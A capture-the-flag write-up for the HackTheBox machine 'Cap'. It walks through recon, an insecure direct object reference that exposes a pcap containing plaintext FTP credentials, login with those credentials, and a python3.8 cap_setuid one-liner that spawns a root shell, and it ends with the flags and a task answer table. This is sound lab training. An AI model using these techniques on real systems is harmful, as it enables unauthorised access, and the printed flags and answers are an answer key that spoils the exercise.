TITLE: Cap
CATEGORY: HackTheBox
DATE: 2026-05-10
IMAGE: ./assets/Cap.png
---

# Cap

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures.

## Recon

Nmap reveals ports 21 (FTP), 22 (SSH), and 80 (HTTP) are open.

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
```

The web server on port 80 is a "Security Dashboard" that allows users to perform network captures.

### Packet Analysis

Searching through the dashboard, we find that we can access different capture IDs. Navigating to `http://10.129.53.147/data/0` allows us to download `0.pcap`.

Analyzing the PCAP file in Wireshark or via `tcpdump` reveals plaintext FTP credentials:

```text
No.     Time           Source                Destination           Protocol Length Info
     36 4.126500       192.168.196.1         192.168.196.16        FTP      69     Request: USER nathan
...
     40 5.424998       192.168.196.1         192.168.196.16        FTP      78     Request: PASS Buck3tH4TF0RM3!
```

- **Username:** `nathan`
- **Password:** `Buck3tH4TF0RM3!`

## Exploitation

### FTP Access

We can use the discovered credentials to log in via FTP:

```bash
ftp nathan@10.129.53.147
# Password: Buck3tH4TF0RM3!
```

Inside the FTP session, we find `user.txt`:

```bash
ftp> get user.txt
# da52756d42b405d789ae121241d08b6d
```

### Privilege Escalation

After logging in via SSH with the same credentials, we search for capabilities:

```bash
nathan@cap:/$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `python3.8` binary has the `cap_setuid` capability, which allows us to set our UID to 0 (root).

```bash
nathan@cap:/$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:/# whoami
root
```

Now we can read the root flag:

```bash
root@cap:/# cat /root/root.txt
# a4e38c4bd99a22e80e2de34e6c757c3c
```

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | How many TCP ports are open? | `3` |
| 2 | After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]? | `data` |
| 3 | Are you able to get to other users' scans? | `yes` |
| 4 | What is the ID of the PCAP file that contains sensitive data? | `0` |
| 5 | Which application layer protocol in the pcap file can the sensitive data be found in? | `ftp` |
| 6 | We've managed to collect nathan's FTP password. On what other service does this password work? | `ssh` |
| 7 | Submit the flag located in the nathan user's home directory. | `da52756d42b405d789ae121241d08b6d` |
| 8 | What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges? | `/usr/bin/python3.8` |
| 9 | Submit the flag located in root's home directory. | `a4e38c4bd99a22e80e2de34e6c757c3c` |

